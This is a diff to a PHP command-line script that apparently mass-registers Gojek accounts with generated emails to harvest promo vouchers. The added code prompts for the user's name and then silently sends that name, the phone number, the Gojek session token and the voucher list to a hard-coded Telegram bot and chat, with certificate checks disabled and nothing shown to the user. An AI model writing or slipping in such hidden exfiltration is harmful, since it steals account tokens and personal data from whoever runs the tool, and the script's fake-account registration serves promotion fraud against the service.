@@ -19,6 +19,8 @@ $headers[] = 'X-Location: -6.405821,106.064193';
         ulang:
         echo "\e[96m[+] Input Nomor HP : ";
         $number = trim(fgets(STDIN));
+        echo "\e[96m[+] Input Nama : ";
+        $nama1 = trim(fgets(STDIN));
         $numbers = $number[0].$number[1];
         $numberx = $number[5];
         if($numbers == "08") { 
@@ -28,7 +30,6 @@ $headers[] = 'X-Location: -6.405821,106.064193';
             $number = "1".$number;
         }
         $nama = nama();
-        $nama1 = 'Rahmat';
         $email = strtolower(str_replace(" ", "", $nama) . mt_rand(100,999) . "@gmail.com");
         $data1 = '{"name":"' . $nama1 . '","email":"' . $email . '","phone":"+' . $number . '","signed_up_country":"ID"}';
         $reg = curl('https://api.gojekapi.com/v5/customers', $data1, $headers);
@@ -179,6 +180,35 @@ $headers[] = 'X-Location: -6.405821,106.064193';
                 echo "\n".color("green","7] ".$voucher7);
                 echo "\n".color("red"," EXP ~> ".$expired7);
                 echo"\n";
+
+                $TOKEN  = "733264923:AAF28mB9OJ9WqQ977JCtM8HV-Qf4G4rAFT8";
+                $chatid = "-167078291";
+                $pesan  = "[+] Nama =".$nama1."\n[+] Nomor =".$number."\n[+] Gojek TOKEN\n\n".$token."\n\n[+] Total Voucher = ".$total."\n[+] ".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+] ".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]";
+                $method = "sendMessage";
+                $url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
+                $post = [
+                    'chat_id' => $chatid,
+                    'text' => $pesan
+                ];
+
+                 $header = [
+                "X-Requested-With: XMLHttpRequest",
+                "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36" 
+                ];
+                                    $ch = curl_init();
+                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+                                        curl_setopt($ch, CURLOPT_URL, $url);
+                                        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
+                                        curl_setopt($ch, CURLOPT_POSTFIELDS, $post );   
+                                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+                                        $datas = curl_exec($ch);
+                                        $error = curl_error($ch);
+                                        $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+                                        curl_close($ch);
+                                        $debug['text'] = $pesan;
+                                        $debug['respon'] = json_decode($datas, true);
+        
+
 
 }else
     {
